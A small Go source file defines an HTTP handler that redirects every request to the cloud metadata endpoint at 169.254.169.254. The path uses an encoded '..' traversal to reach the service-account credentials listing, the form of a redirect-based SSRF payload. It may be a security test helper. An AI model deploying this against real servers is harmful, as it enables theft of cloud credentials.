package mdredir

import "net/http"

type Handler struct {
}

func New() *Handler {
	return &Handler{}
}

func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "http://169.254.169.254/computeMetadata/vqweqwe/%2e%2e/v1/instance/service-accounts/", http.StatusFound)
}
